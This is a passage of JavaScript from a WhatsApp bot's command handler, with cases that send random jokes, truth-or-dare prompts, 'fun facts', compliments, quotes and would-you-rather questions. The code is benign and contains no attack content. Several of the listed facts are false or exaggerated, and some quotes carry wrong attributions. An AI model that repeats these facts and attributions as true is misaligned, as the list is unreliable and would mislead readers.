            "I told my wife she was getting too emotional during our argument, but she didn’t take it well. She stormed off to the freezer and threw a bag of peas at me. It was a real cold shoulder.",
            "I couldn't figure out how to put my seatbelt on, but then I realized I was just too tight.",
            "I used to play piano by ear, but now I use my hands.",
            "I'm reading a book about anti-gravity, it's impossible to put down.",
            "I have a fear of speed bumps, but I’m slowly getting over them.",
            "I used to play piano by ear, but now I use my hands.",
            "What do you call a pile of cats? A meow-tain.",
            "Why don't skeletons fight each other? They don’t have the guts!",
            "I used to be a baker, but I couldn't make enough dough.",
            "How do you make a tissue dance? You put a little boogey in it!",
            "Why did the golfer bring an extra pair of pants? In case he got a hole in one.",
            "I told my computer I needed a break, and it froze.",
            "I got a job at a bakery because I kneaded dough.",
            "What did one wall say to the other? I’ll meet you at the corner.",
            "I’m reading a book on anti-gravity. It’s impossible to put down.",
            "What’s a skeleton’s least favorite room in the house? The living room.",
            "Why don’t some couples go to the gym? Because some relationships don’t work out.",
            "What’s orange and sounds like a parrot? A carrot!",
            "I told my wife she was drawing her eyebrows too high. She looked surprised.",
            "Why do cows have hooves instead of feet? Because they lactose.",
            "I couldn’t figure out how to put my seatbelt on. But then I realized I was just too tight.",
            "I’m no good at math, but I know that one plus one equals two… unless you're doing algebra.",
            "What’s a skeleton’s least favorite room in the house? The living room.",
            "Why do cows have hooves instead of feet? Because they lactose.",
            "Why don’t oysters donate to charity? Because they are shellfish.",
            "I want to be a professional kleptomaniac, but I’m just stealing time.",
            "What did one wall say to the other? I'll meet you at the corner.",
            "I have a fear of speed bumps, but I am slowly getting over it.",
            "What’s a skeleton’s least favorite room in the house? The living room.",
            "I told my computer I needed a break, and it froze.",
            "What do you call fake spaghetti? An impasta!",
            "I told my wife she was getting too emotional during our argument, but she didn’t take it well.",
            "I have a joke about construction, but I’m still working on it.",
            "I threw a boomerang 10 years ago and I still haven’t gotten it back.",
            "What do you call an alligator in a vest? An investigator.",
            "What do you call a bear with no teeth? A gummy bear.",
            "Why don’t some couples go to the gym? Because some relationships don’t work out.",
            "I’ve started investing in stocks: beef, chicken, and vegetable. One day I hope to be a bouillonaire.",
            "I got a job at a bakery because I kneaded dough.",
            "What’s a skeleton’s least favorite room in the house? The living room."
        ];
        await XeonBotInc.sendMessage(m.chat, {
            text: `*🤣 Joke Time! 🤣*\n\n${jokes[Math.floor(Math.random() * jokes.length)]}\n\n*Hope that made you smile! 😄*`
        }, { quoted: m });

    } catch (err) {
        replygcxeon('❌ An error occurred while retrieving the joke. Please try again later.');
        console.error('Joke error:', err);
    }
    break;
    case 'truth':
    try {
        // List of 100 truth questions
        const truthQuestions = [
            "What is your biggest fear?",
            "Have you ever lied to get out of trouble?",
            "What’s something you’ve never told anyone?",
            "If you could switch lives with someone for a day, who would it be?",
            "What’s the most embarrassing thing you’ve done?",
            "If you had to choose one person to be stuck with on a deserted island, who would it be?",
            "Have you ever had a crush on someone in this group?",
            "What’s the most awkward situation you’ve ever been in?",
            "If you could erase one event from your memory, what would it be?",
            "What’s one thing you regret doing in your life?",
            "What’s the last lie you told?",
            "Have you ever cheated in a relationship?",
            "What’s the most embarrassing thing that’s happened to you in public?",
            "What’s something you’ve done that your parents would disapprove of?",
            "Have you ever stolen something?",
            "What’s a secret you’ve never shared?",
            "What’s your biggest pet peeve?",
            "Who was your first crush?",
            "What’s the worst thing you’ve ever done to someone?",
            "Have you ever been in love?",
            "If you could date anyone in this group, who would it be?",
            "What’s something you’re really insecure about?",
            "What’s the worst date you’ve ever had?",
            "Have you ever had an awkward moment with someone you liked?",
            "What’s the craziest thing you’ve done for love?",
            "Have you ever had a one-night stand?",
            "What’s your worst habit?",
            "What’s your favorite physical feature about yourself?",
            "What’s your most embarrassing childhood memory?",
            "If you could live anywhere in the world, where would it be?",
            "What’s the most embarrassing thing you’ve said to someone?",
            "Have you ever cried in front of someone?",
            "What’s a secret talent you have?",
            "What’s your biggest insecurity?",
            "What’s the worst thing you’ve done at work or school?",
            "What’s the worst advice you’ve ever taken?",
            "Have you ever been caught doing something you shouldn’t?",
            "If you could be famous for something, what would it be?",
            "What’s one thing you’ve always wanted to do but never had the courage to?",
            "Have you ever broken someone’s heart?",
            "What’s the most rebellious thing you’ve done?",
            "Have you ever had a crush on a teacher?",
            "What’s the weirdest dream you’ve ever had?",
            "What’s the most awkward thing you’ve ever done to impress someone?",
            "If you could switch bodies with someone for a day, who would it be?",
            "What’s the worst mistake you’ve made in a relationship?",
            "Have you ever been in a secret relationship?",
            "What’s the worst gift you’ve ever received?",
            "What’s your biggest turn-on?",
            "Have you ever told someone you loved them without meaning it?",
            "What’s the worst job you’ve ever had?",
            "Have you ever lied on your resume?",
            "What’s something you’ve done that made you feel proud?",
            "Have you ever ghosted someone?",
            "What’s the biggest lie you’ve ever told?",
            "What’s one thing you would change about yourself?",
            "If you could have one wish right now, what would it be?",
            "Have you ever been in a physical fight?",
            "What’s the most embarrassing thing that happened to you in school?",
            "What’s something you’ve never told anyone about your childhood?",
            "What’s something you’ve done that your friends don’t know about?",
            "What’s your most awkward family gathering memory?",
            "What’s something you would never do even for a million dollars?",
            "Have you ever been in trouble with the law?",
            "What’s the last thing you searched for on your phone?",
            "Have you ever done something that you regretted instantly?",
            "What’s the worst thing you’ve done at a party?",
            "What’s something you hate about yourself?",
            "Have you ever betrayed a friend?",
            "What’s the weirdest thing you’ve ever eaten?",
            "What’s the most embarrassing thing you’ve done on a date?",
            "If you could change one thing about your personality, what would it be?",
            "Have you ever had a crush on someone you shouldn’t?",
            "What’s something you’ve done that you’d never admit to anyone?",
            "What’s the worst advice you’ve ever given?",
            "What’s the most awkward thing you’ve done in a job interview?",
            "Have you ever been caught cheating on a test?",
            "What’s the most embarrassing thing you’ve done on social media?",
            "What’s the worst thing you’ve done for money?",
            "Have you ever been attracted to someone’s partner?",
            "What’s the craziest thing you’ve ever done on a dare?",
            "Have you ever been rejected by someone you liked?",
            "What’s the worst breakup you’ve ever had?",
            "What’s the worst decision you’ve made in the past year?",
            "Have you ever lied to your best friend?",
            "What’s the most embarrassing thing you’ve done while drunk?",
            "What’s something you’ve done to avoid confrontation?",
            "Have you ever been caught sneaking out?",
            "What’s the worst thing you’ve done in the name of revenge?",
            "Have you ever done something you’re ashamed of in public?",
            "What’s something you’ve been hiding from your family?",
            "What’s the most embarrassing thing you’ve done at work?",
            "Have you ever taken a risk that didn’t pay off?",
            "What’s something you’ve done that you’re proud of but never told anyone?",
            "What’s the weirdest thing you’ve found on the internet?",
            "What’s the most embarrassing text you’ve sent?",
            "What’s the last thing you lied about?",
            "What’s the worst job interview you’ve ever had?",
            "Have you ever been in an awkward situation with someone you didn’t know well?",
            "What’s your most embarrassing online moment?",
            "What’s the most embarrassing thing you’ve done in front of your crush?",
            "What’s your biggest regret in life?",
            "Have you ever made a prank call?",
            "What’s your most embarrassing family moment?",
            "Have you ever been in love with someone who didn’t love you back?"
        ];

        // Send a random truth question directly to the user
        await XeonBotInc.sendMessage(m.chat, {
            text: `*😳 Truth Time! 😳*\n\n${truthQuestions[Math.floor(Math.random() * truthQuestions.length)]}\n\n*Your turn to be honest! 😅*`
        }, { quoted: m });

    } catch (err) {
        replygcxeon('❌ An error occurred while retrieving the truth question. Please try again later.');
        console.error('Truth error:', err);
    }
    break;
    case 'dare':
    try {
        // List of 100 dare challenges
        const dareChallenges = [
            "I dare you to send a funny selfie to the group.",
            "I dare you to try to sing a song and send the voice note.",
            "I dare you to do 10 push-ups and send a video of it.",
            "I dare you to post a random emoji in the chat and leave it there for 10 minutes.",
            "I dare you to tell a funny joke to the group right now.",
            "I dare you to make a funny face and send a photo of it.",
            "I dare you to send a message in a completely different accent for the rest of the chat.",
            "I dare you to share an embarrassing childhood story.",
            "I dare you to share your last search history with the group.",
            "I dare you to send a voice note singing your favorite song.",
            "I dare you to write a funny poem about someone in the group.",
            "I dare you to try a dance move and record it.",
            "I dare you to pretend to be a celebrity for the next 10 minutes.",
            "I dare you to tell the funniest joke you know.",
            "I dare you to post a random video of you dancing to any song.",
            "I dare you to share a weird secret talent you have.",
            "I dare you to make a prank call to someone in the group.",
            "I dare you to try to talk in rhyme for the next 5 minutes.",
            "I dare you to share an embarrassing story from your teenage years.",
            "I dare you to tell the group an embarrassing fact about yourself.",
            "I dare you to do your best impression of someone in the group.",
            "I dare you to act like a robot for the next 5 minutes.",
            "I dare you to do 20 jumping jacks on camera.",
            "I dare you to speak only in questions for the next 5 minutes.",
            "I dare you to share a weird food combination you like.",
            "I dare you to send a voice note singing the alphabet.",
            "I dare you to make a funny face and keep it for 30 seconds.",
            "I dare you to send a video of you making an unusual sound.",
            "I dare you to pretend you are a character from a movie for 5 minutes.",
            "I dare you to do an impression of someone famous and send a video.",
            "I dare you to wear something ridiculous and send a photo of yourself.",
            "I dare you to try a random dance challenge from TikTok.",
            "I dare you to change your profile picture to something funny for 24 hours.",
            "I dare you to post a video of you attempting a backflip.",
            "I dare you to do your best impression of an animal sound.",
            "I dare you to make a funny voice and send a voice note.",
            "I dare you to eat something spicy and record your reaction.",
            "I dare you to wear socks on your hands and take a picture.",
            "I dare you to sing a random song loudly in your room and send a video.",
            "I dare you to draw a silly doodle and share it with the group.",
            "I dare you to take a 10-second video of you jumping up and down.",
            "I dare you to make up a silly song and sing it for the group.",
            "I dare you to act like a famous celebrity for the next 10 minutes.",
            "I dare you to wear your clothes backward for the next hour.",
            "I dare you to take a picture of your messy room and share it.",
            "I dare you to do a cartwheel and record it.",
            "I dare you to try to say the alphabet backwards.",
            "I dare you to put your favorite item of clothing on your head and take a picture.",
            "I dare you to send a video of you eating something sour.",
            "I dare you to post a video of you trying to imitate an animal's walk.",
            "I dare you to send a video of you lip-syncing to a song.",
            "I dare you to dance like a robot for one minute.",
            "I dare you to write a funny tweet and share it on social media.",
            "I dare you to record yourself eating a spoonful of peanut butter.",
            "I dare you to do a slow-motion video of you jumping in the air.",
            "I dare you to try to juggle three objects and film yourself.",
            "I dare you to sing a love song in a funny voice.",
            "I dare you to talk in rhyme for the next five messages.",
            "I dare you to take a photo of your reaction to seeing an animal on TV.",
            "I dare you to put on sunglasses and walk around your house like you're famous.",
            "I dare you to say a tongue twister five times fast without making a mistake.",
            "I dare you to create a new handshake with someone and record it.",
            "I dare you to try to touch your toes while standing for one minute.",
            "I dare you to send a voice message singing the chorus of your favorite song.",
            "I dare you to make a TikTok video of you doing a silly challenge.",
            "I dare you to send a video of you pretending to be a superhero.",
            "I dare you to take a silly selfie with a random object.",
            "I dare you to send a video of you trying to jump rope for one minute.",
            "I dare you to try to walk like a penguin for 30 seconds.",
            "I dare you to try to mimic the sound of a duck.",
            "I dare you to talk to a random person and try to make them laugh.",
            "I dare you to post a funny meme on your story.",
            "I dare you to send a video of you trying a new hairstyle.",
            "I dare you to create a funny, short skit and send it to the group.",
            "I dare you to record yourself acting out a scene from a movie.",
            "I dare you to put on the most ridiculous outfit you have and take a picture.",
            "I dare you to make a funny video and try to get everyone to laugh.",
            "I dare you to share a funny story that happened to you recently.",
            "I dare you to do a dramatic reading of a children’s book.",
            "I dare you to attempt a yoga pose and send a photo.",
            "I dare you to make a short video of you doing your best runway walk.",
            "I dare you to send a voice note singing any song with enthusiasm.",
            "I dare you to record yourself doing a funny dance move.",
            "I dare you to put your clothes on inside out and take a picture.",
            "I dare you to try to make a sandwich blindfolded and send a video of it.",
            "I dare you to act like you're on a cooking show and demonstrate making a simple snack.",
            "I dare you to do 20 sit-ups in a row and record it.",
            "I dare you to talk in a funny accent for the next 10 minutes.",
            "I dare you to write a poem about someone in the group.",
            "I dare you to create a funny TikTok dance and share it.",
            "I dare you to do a dramatic reading of the lyrics to a pop song.",
            "I dare you to send a voice note singing the first verse of your favorite song.",
            "I dare you to wear your clothes in a crazy combination for the next hour.",
            "I dare you to try to do a split and send a video.",
            "I dare you to make up a silly nickname for yourself and introduce yourself with it.",
            "I dare you to send a video of you making a funny face.",
            "I dare you to try a random food combination and film your reaction.",
            "I dare you to take a 5-second video of you jumping around like a kangaroo.",
            "I dare you to act like a famous cartoon character for the next 5 minutes.",
            "I dare you to imitate a famous celebrity’s voice and send a voice note.",
            "I dare you to wear socks on your hands for the next 15 minutes.",
            "I dare you to tell a really cheesy joke to the group.",
            "I dare you to wear a ridiculous wig and take a picture.",
            "I dare you to try to balance an object on your head for one minute."
        ];

        // Send a random dare challenge directly to the user
        await XeonBotInc.sendMessage(m.chat, {
            text: `*😜 Dare Time! 😜*\n\n${dareChallenges[Math.floor(Math.random() * dareChallenges.length)]}\n\n*Are you up for it?*`
        }, { quoted: m });

    } catch (err) {
        replygcxeon('❌ An error occurred while retrieving the dare challenge. Please try again later.');
        console.error('Dare error:', err);
    }
    break;
    case 'fact':
    try {
        // List of 100 random facts
        const facts = [
            "Bananas are berries, but strawberries aren’t.",
            "A group of flamingos is called a 'flamboyance.'",
            "Honey never spoils. Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3,000 years old and still perfectly edible.",
            "Octopuses have three hearts and blue blood.",
            "The Eiffel Tower can be 15 cm taller during the summer due to the expansion of metal in heat.",
            "Wombat poop is cube-shaped.",
            "The shortest commercial flight in the world is between two Scottish islands and lasts only 57 seconds.",
            "A day on Venus is longer than a year on Venus.",
            "Cleopatra lived closer in time to the moon landing than to the construction of the Great Pyramid of Giza.",
            "The longest hiccuping spree lasted 68 years.",
            "You can't hum while holding your nose.",
            "The inventor of the Pringles can is buried in one.",
            "Sharks existed before trees.",
            "Cows have best friends and can become stressed when separated from them.",
            "A single cloud can weigh more than a million pounds.",
            "Bamboo can grow up to 35 inches in a single day.",
            "The heart of a blue whale is the size of a small car.",
            "There are more stars in the universe than grains of sand on all the Earth’s beaches.",
            "A bolt of lightning is five times hotter than the surface of the sun.",
            "Sloths can hold their breath for up to 40 minutes underwater.",
            "The unicorn is Scotland’s national animal.",
            "Polar bear skin is black, although their fur appears white.",
            "Apples are more effective at waking you up in the morning than coffee.",
            "The shortest war in history lasted 38 to 45 minutes between Britain and Zanzibar in 1896.",
            "Hawaii moves 7.5cm closer to Japan every year.",
            "Cows can walk upstairs, but they can’t walk down.",
            "In space, astronauts cannot cry because there is no gravity to make the tears flow.",
            "Venus is the hottest planet in our solar system, even though Mercury is the closest to the Sun.",
            "A crocodile cannot stick its tongue out.",
            "The longest time between two twins being born is 87 days.",
            "Koalas sleep up to 22 hours a day.",
            "Dolphins have names for each other and can call out to each other.",
            "The Great Wall of China is not visible from space with the naked eye.",
            "Banging your head against a wall for one hour burns 150 calories.",
            "The Eiffel Tower can be 15 cm taller during the summer.",
            "An astronaut's height can change by up to 2 inches in space.",
            "The first person to go to space was Yuri Gagarin from the Soviet Union in 1961.",
            "Sharks can live for up to 400 years.",
            "There are no naturally occurring blue foods.",
            "The world’s oldest piece of chewing gum is over 9,000 years old.",
            "Mount Everest grows by about 4 millimeters every year.",
            "A jellyfish is 95% water.",
            "The average person walks the equivalent of three times around the world in a lifetime.",
            "One teaspoon of honey represents the life work of 12 bees.",
            "There are more trees on Earth than there are stars in the Milky Way.",
            "The word 'nerd' was first coined by Dr. Seuss in *If I Ran the Zoo*.",
            "There is a species of jellyfish that is biologically immortal.",
            "A day on Mercury is twice as long as a year on Mercury.",
            "Cheetahs are the fastest land animals and can run up to 60 mph.",
            "A blue whale’s tongue can weigh as much as an elephant.",
            "The first video ever uploaded to YouTube was titled 'Me at the zoo.'",
            "The longest hiccuping spree lasted 68 years.",
            "An ostrich’s eye is bigger than its brain.",
            "A group of owls is called a parliament.",
            "A snail can sleep for three years.",
            "Peanuts are not nuts; they are legumes.",
            "Sloths can take up to a month to digest their food.",
            "There are more fake flamingos in the world than real ones.",
            "The longest place name in the world is in New Zealand and has 85 characters.",
            "A giraffe's neck contains the same number of vertebrae as a human’s neck.",
            "The unicorn is Scotland’s national animal.",
            "An octopus has three hearts and blue blood.",
            "A sneeze can travel as fast as 100 miles per hour.",
            "The human nose can distinguish at least 1 trillion different scents.",
            "There’s a species of fungus called *'Zombie fungus'* that can take control of ants' bodies.",
            "A shrimp's heart is located in its head.",
            "In Japan, there’s a museum dedicated entirely to Ramen noodles.",
            "The longest hiccuping spree lasted for 68 years.",
            "A panda's diet consists of 99% bamboo.",
            "The most commonly used letter in the English language is 'e'.",
            "Bananas are naturally radioactive.",
            "Honey never spoils.",
            "There’s a species of jellyfish that can revert to its youthful state after adulthood.",
            "Venus is the hottest planet in the solar system.",
            "Elephants can hear through their feet.",
            "Astronauts' height changes in space due to the absence of gravity.",
            "A duck's quack doesn't echo.",
            "The longest wedding veil was longer than 63 football fields.",
            "A day on Neptune lasts 16 hours.",
            "The Eiffel Tower was originally intended to be a temporary structure.",
            "Cats have 32 muscles in each ear.",
            "The longest recorded time without sleep is 11 days.",
            "The shortest war in history was between Britain and Zanzibar, lasting only 38 minutes.",
            "There are no words in the dictionary that rhyme with 'orange.'",
            "A day on Mars is only 40 minutes longer than a day on Earth.",
            "The sound of a whip cracking is faster than the speed of sound.",
            "A leap year has 366 days instead of 365.",
            "A sneeze can travel at speeds of up to 100 miles per hour.",
            "One light-year is about 5.88 trillion miles.",
            "A giraffe’s tongue is about 18 inches long.",
            "The human eye can distinguish about 10 million different colors.",
            "A snail can sleep for three years.",
            "The strongest muscle in the human body is the masseter (jaw muscle).",
            "The world’s largest desert is the Antarctic Desert.",
            "You can’t hum while holding your nose.",
            "The longest hiccuping spree lasted for 68 years.",
            "Polar bears have black skin beneath their white fur.",
            "The largest snowflake ever recorded was 15 inches wide.",
            "The moon is moving away from the Earth by about 1.5 inches each year.",
            "The world’s smallest mammal is the bumblebee bat.",
            "The first recorded Olympic Games were held in 776 BC in Greece.",
            "An octopus can change its color to blend into its surroundings.",
            "A frog can freeze itself in winter and thaw out in the spring.",
            "The longest time someone has gone without eating is 382 days.",
            "Caffeine is the most widely used psychoactive drug in the world.",
            "The longest time anyone has held their breath underwater is 24 minutes.",
            "A panda’s thumb is actually an extended wrist bone.",
            "The largest living organism in the world is a fungus in Oregon, covering 2,385 acres."
        ];

        // Send a random fact directly to the user
        await XeonBotInc.sendMessage(m.chat, {
            text: `*🤯 Fun Fact Time! 🤯*\n\n${facts[Math.floor(Math.random() * facts.length)]}\n\n*Did you learn something new? 🤓*`
        }, { quoted: m });

    } catch (err) {
        replygcxeon('❌ An error occurred while retrieving the fact. Please try again later.');
        console.error('Fact error:', err);
    }
    break;
    case 'compliment':
    try {
        const compliments = [
            "You're an amazing person, inside and out!",
            "You have such a beautiful soul!",
            "Your smile is contagious!",
            "You're so smart and creative!",
            "You light up the room whenever you walk in!",
            "You're an absolute joy to be around!",
            "Your energy is so positive!",
            "You're doing great things, keep it up!",
            "You have a heart of gold!",
            "Your kindness makes the world a better place!",
            "You make everything seem so easy!",
            "You're a true inspiration!",
            "The world needs more people like you!",
            "Your laugh is the best sound ever!",
            "You're a natural at everything you do!",
            "You radiate positivity and joy!",
            "You're a shining star!",
            "You have an incredible ability to make people feel good!",
            "Your creativity knows no bounds!",
            "You are a one-of-a-kind gem!",
            "You're an amazing listener!",
            "You have such an infectious enthusiasm!",
            "You're always so thoughtful and considerate!",
            "You're a beautiful person, inside and out!",
            "You have a gift for making everyone feel special!",
            "You're a master at everything you do!",
            "Your personality lights up every room!",
            "You're a true friend and a loyal companion!",
            "You're always so brave and courageous!",
            "You have such a unique and special perspective!",
            "You're one of a kind, and that's awesome!",
            "Your sense of humor is absolutely amazing!",
            "You're such a positive influence on everyone around you!",
            "You're full of incredible ideas!",
            "You have such an infectious energy!",
            "You're a dream to work with!",
            "You have a special way of making others feel at ease!",
            "You're truly a ray of sunshine!",
            "Your intelligence is so impressive!",
            "You're an inspiration to those around you!",
            "You make life so much better just by being in it!",
            "You have such an amazing work ethic!",
            "You brighten up everyone's day!",
            "You're such a hard worker, and it shows!",
            "You're an absolute star in everything you do!",
            "You have the most beautiful heart!",
            "You always know how to make people smile!",
            "You're such a thoughtful and caring person!",
            "You're a great role model!",
            "You have a unique and beautiful perspective on life!",
            "You always brighten up the room with your presence!",
            "You're someone who everyone loves being around!",
            "You have an incredible ability to make others feel special!",
            "You're a true visionary!",
            "Your wisdom is beyond your years!",
            "You're always so encouraging and uplifting!",
            "You're always so patient and understanding!",
            "You have such a beautiful, positive spirit!",
            "You inspire others to be the best version of themselves!",
            "You're so passionate about everything you do!",
            "Your energy is absolutely magnetic!",
            "You're such a great team player!",
            "You make the world a better place just by being you!",
            "Your presence makes everything better!",
            "You are so genuinely kind and caring!",
            "You're such an incredible problem solver!",
            "You're an amazing motivator!",
            "You have such a beautiful mind!",
            "You're so generous with your time and energy!",
            "You have a great sense of style!",
            "You're an absolute joy to be around!",
            "You make everyone feel so comfortable!",
            "You're always so supportive and encouraging!",
            "You're a true leader in every sense of the word!",
            "You're someone that people admire and look up to!",
            "You have such a big heart!",
            "You're always so thoughtful and kind-hearted!",
            "You're truly a gem in this world!",
            "You have a way of making everyone feel important!",
            "You bring so much joy to those around you!",
            "You have a fantastic sense of humor!",
            "You're a natural at making people feel valued!",
            "You're such a great friend!",
            "You have such an amazing soul!",
            "You bring so much positivity into the world!",
            "You're such a great listener and friend!",
            "You have a heart that’s always open to others!",
            "You make every day brighter just by being you!",
            "You have the most wonderful energy!",
            "You make everyone feel so welcome!",
            "You're an amazing person to have around!",
            "You're such a wonderful spirit!",
            "You're always so kind and generous!",
            "You have an incredible ability to make others feel comfortable!",
            "You're a true gem!",
            "You're so kind-hearted and generous!",
            "You're truly one of a kind!",
            "You're the kind of person who makes the world a better place!",
            "You're amazing just the way you are!",
            "You're full of incredible potential!",
            "You have such a magnetic personality!",
            "You're a treasure to be around!",
            "You're always so friendly and approachable!",
            "You make the world more beautiful just by being in it!",
            "You're an absolute gem of a person!",
            "You're always so full of life!",
            "You brighten everyone's day just by being yourself!",
            "You're truly one of the most remarkable people I know!"
        ];

        await XeonBotInc.sendMessage(m.chat, {
            text: `*💖 Compliment Time! 💖*\n\n${compliments[Math.floor(Math.random() * compliments.length)]}`
        }, { quoted: m });

    } catch (err) {
        replygcxeon('❌ An error occurred while retrieving the compliment. Please try again later.');
        console.error('Compliment error:', err);
    }
    break;
    case 'quote':
    try {
        const quotes = [
            "The only way to do great work is to love what you do. – Steve Jobs",
            "Success is not the key to happiness. Happiness is the key to success. – Albert Schweitzer",
            "Don't watch the clock; do what it does. Keep going. – Sam Levenson",
            "The best way to predict the future is to create it. – Abraham Lincoln",
            "Believe you can and you're halfway there. – Theodore Roosevelt",
            "In the middle of every difficulty lies opportunity. – Albert Einstein",
            "What lies behind us and what lies before us are tiny matters compared to what lies within us. – Ralph Waldo Emerson",
            "Do not wait to strike till the iron is hot, but make it hot by striking. – William Butler Yeats",
            "It does not matter how slowly you go as long as you do not stop. – Confucius",
            "The future belongs to those who believe in the beauty of their dreams. – Eleanor Roosevelt",
            "The only way to achieve the impossible is to believe it is possible. – Charles Kingsleigh",
            "Act as if what you do makes a difference. It does. – William James",
            "Success is not final, failure is not fatal: It is the courage to continue that counts. – Winston Churchill",
            "It always seems impossible until it's done. – Nelson Mandela",
            "You miss 100% of the shots you don't take. – Wayne Gretzky",
            "Everything you can imagine is real. – Pablo Picasso",
            "Life is 10% what happens to us and 90% how we react to it. – Charles R. Swindoll",
            "Don’t wait. The time will never be just right. – Napoleon Hill",
            "Your time is limited, so don’t waste it living someone else’s life. – Steve Jobs",
            "To be yourself in a world that is constantly trying to make you something else is the greatest accomplishment. – Ralph Waldo Emerson",
            "The only limit to our realization of tomorrow is our doubts of today. – Franklin D. Roosevelt",
            "Happiness is not something ready-made. It comes from your own actions. – Dalai Lama",
            "The pessimist sees difficulty in every opportunity. The optimist sees opportunity in every difficulty. – Winston Churchill",
            "Do what you can with all you have, wherever you are. – Theodore Roosevelt",
            "It is never too late to be what you might have been. – George Eliot",
            "A journey of a thousand miles begins with a single step. – Lao Tzu",
            "You must be the change you wish to see in the world. – Mahatma Gandhi",
            "Your life does not get better by chance, it gets better by change. – Jim Rohn",
            "We do not remember days, we remember moments. – Cesare Pavese",
            "The harder you work for something, the greater you’ll feel when you achieve it. – Unknown",
            "Dream big and dare to fail. – Norman Vaughan",
            "Don't be afraid to give up the good to go for the great. – John D. Rockefeller",
            "Success is walking from failure to failure with no loss of enthusiasm. – Winston Churchill",
            "Don't watch the clock; do what it does. Keep going. – Sam Levenson",
            "You don’t have to be great to start, but you have to start to be great. – Zig Ziglar",
            "The only way to do great work is to love what you do. – Steve Jobs",
            "If you can dream it, you can do it. – Walt Disney",
            "Everything you can imagine is real. – Pablo Picasso",
            "Life is either a daring adventure or nothing at all. – Helen Keller",
            "The best way to predict the future is to invent it. – Alan Kay",
            "You are never too old to set another goal or to dream a new dream. – C.S. Lewis",
            "I find that the harder I work, the more luck I seem to have. – Thomas Jefferson",
            "Success usually comes to those who are too busy to be looking for it. – Henry David Thoreau",
            "The only person you are destined to become is the person you decide to be. – Ralph Waldo Emerson",
            "You only live once, but if you do it right, once is enough. – Mae West",
            "Success is the sum of small efforts, repeated day in and day out. – Robert Collier",
            "Everything has beauty, but not everyone can see it. – Confucius",
            "To be great is to be misunderstood. – Ralph Waldo Emerson",
            "In the end, we will remember not the words of our enemies, but the silence of our friends. – Martin Luther King Jr.",
            "The journey of a thousand miles begins with one step. – Lao Tzu",
            "Live as if you were to die tomorrow. Learn as if you were to live forever. – Mahatma Gandhi",
            "It does not matter how slowly you go, as long as you do not stop. – Confucius",
            "What you get by achieving your goals is not as important as what you become by achieving your goals. – Zig Ziglar",
            "Believe you can and you're halfway there. – Theodore Roosevelt",
            "The only thing standing between you and your goal is the story you keep telling yourself as to why you can’t achieve it. – Jordan Belfort",
            "It’s not whether you get knocked down, it’s whether you get up. – Vince Lombardi",
            "You are braver than you believe, stronger than you seem, and smarter than you think. – A.A. Milne",
            "Success is not in what you have, but who you are. – Bo Bennett",
            "Life isn’t about finding yourself. Life is about creating yourself. – George Bernard Shaw",
            "If you want to achieve greatness stop asking for permission. – Anonymous",
            "You can't use up creativity. The more you use, the more you have. – Maya Angelou",
            "Everything you’ve ever wanted is on the other side of fear. – George Addair",
            "What we think, we become. – Buddha",
            "I am not a product of my circumstances. I am a product of my decisions. – Stephen Covey",
            "Go confidently in the direction of your dreams. Live the life you have imagined. – Henry David Thoreau",
            "The best revenge is massive success. – Frank Sinatra",
            "There are no shortcuts to any place worth going. – Beverly Sills",
            "Do what you love, and you’ll never work another day in your life. – Confucius",
            "Opportunities don't happen, you create them. – Chris Grosser",
            "The harder you work for something, the greater you’ll feel when you achieve it. – Unknown",
            "If you don’t design your own life plan, chances are you’ll fall into someone else’s plan. – Jim Rohn",
            "Everything you can imagine is real. – Pablo Picasso",
            "Success is not final, failure is not fatal: it is the courage to continue that counts. – Winston Churchill",
            "You must be the change you wish to see in the world. – Mahatma Gandhi",
            "The purpose of life is not to be happy. It is to be useful, to be honorable, to be compassionate, to have it make some difference that you have lived and lived well. – Ralph Waldo Emerson",
            "Don’t stop when you’re tired. Stop when you’re done. – Unknown",
            "Life is what happens when you’re busy making other plans. – John Lennon",
            "You can never cross the ocean until you have the courage to lose sight of the shore. – Christopher Columbus",
            "The best way to predict the future is to create it. – Peter Drucker",
            "The only impossible journey is the one you never begin. – Tony Robbins",
            "If you want to live a happy life, tie it to a goal, not to people or things. – Albert Einstein",
            "Don’t wait for the perfect moment. Take the moment and make it perfect. – Unknown",
            "Happiness depends upon ourselves. – Aristotle",
            "Everything has beauty, but not everyone can see it. – Confucius",
            "Your life does not get better by chance, it gets better by change. – Jim Rohn",
            "The journey of a thousand miles begins with a single step. – Lao Tzu",
            "Don’t let yesterday take up too much of today. – Will Rogers",
            "The secret to getting ahead is getting started. – Mark Twain",
            "Don't be pushed around by the fears in your mind. Be led by the dreams in your heart. – Roy T. Bennett",
            "Life is either a daring adventure or nothing at all. – Helen Keller"
        ];
        
        await XeonBotInc.sendMessage(m.chat, {
            text: `*💬 Quote of the Day 💬*\n\n${quotes[Math.floor(Math.random() * quotes.length)]}`
        }, { quoted: m });

    } catch (err) {
        replygcxeon('❌ An error occurred while retrieving the quote. Please try again later.');
        console.error('Quote error:', err);
    }
    break;
    case 'wouldyourather':
    try {
        const wouldYouRatherQuestions = [
            "Would you rather be able to speak all languages or be able to speak to animals?",
            "Would you rather have the ability to fly or the ability to turn invisible?",
            "Would you rather have a rewind button or a pause button in your life?",
            "Would you rather always have to sing instead of speaking or dance everywhere you go?",
            "Would you rather never be able to use the internet again or never be able to watch TV again?",
            "Would you rather be famous for something good or infamous for something bad?",
            "Would you rather always be 10 minutes late or always be 20 minutes early?",
            "Would you rather have a personal chef or a personal driver?",
            "Would you rather never have to sleep again or never have to eat again?",
            "Would you rather live in a world where there is no war or a world where there is no hunger?",
            "Would you rather be able to talk to animals or be able to read minds?",
            "Would you rather be rich but lonely or poor but surrounded by loved ones?",
            "Would you rather have super strength or super intelligence?",
            "Would you rather be able to time travel or teleport anywhere instantly?",
            "Would you rather have a photographic memory or be able to forget anything at will?",
            "Would you rather live in a house on the beach or in a cabin in the mountains?",
            "Would you rather be able to control the weather or have the ability to control time?",
            "Would you rather live without music or without movies?",
            "Would you rather always be hot or always be cold?",
            "Would you rather fight 100 duck-sized horses or one horse-sized duck?",
            "Would you rather be able to breathe underwater or fly through the sky?",
            "Would you rather have the ability to speak every language or master every instrument?",
            "Would you rather be constantly tired but still productive or full of energy but lazy?",
            "Would you rather be the smartest person in the world or the funniest?",
            "Would you rather be able to talk to your past self or your future self?",
            "Would you rather live without social media or without your phone?",
            "Would you rather be able to see the future or change the past?",
            "Would you rather never get tired or never feel pain?",
            "Would you rather never have to work again or never have to sleep again?",
            "Would you rather have an unlimited supply of food or unlimited entertainment?",
            "Would you rather have no responsibilities or have a lot of responsibilities but all paid for?",
